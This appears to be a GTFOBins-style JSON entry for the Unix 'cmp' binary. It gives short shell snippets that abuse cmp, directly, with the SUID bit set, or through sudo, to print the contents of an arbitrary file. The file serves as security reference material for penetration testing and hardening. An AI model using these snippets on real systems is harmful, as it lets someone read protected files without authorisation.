{
  "functions": {
    "file-read": [
      {
        "description": "",
        "code": "LFILE=file_to_read\ncmp $LFILE /dev/zero -b -l\n"
      }
    ],
    "suid": [
      {
        "description": "",
        "code": "LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n"
      }
    ],
    "sudo": [
      {
        "description": "",
        "code": "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l\n"
      }
    ]
  }
}
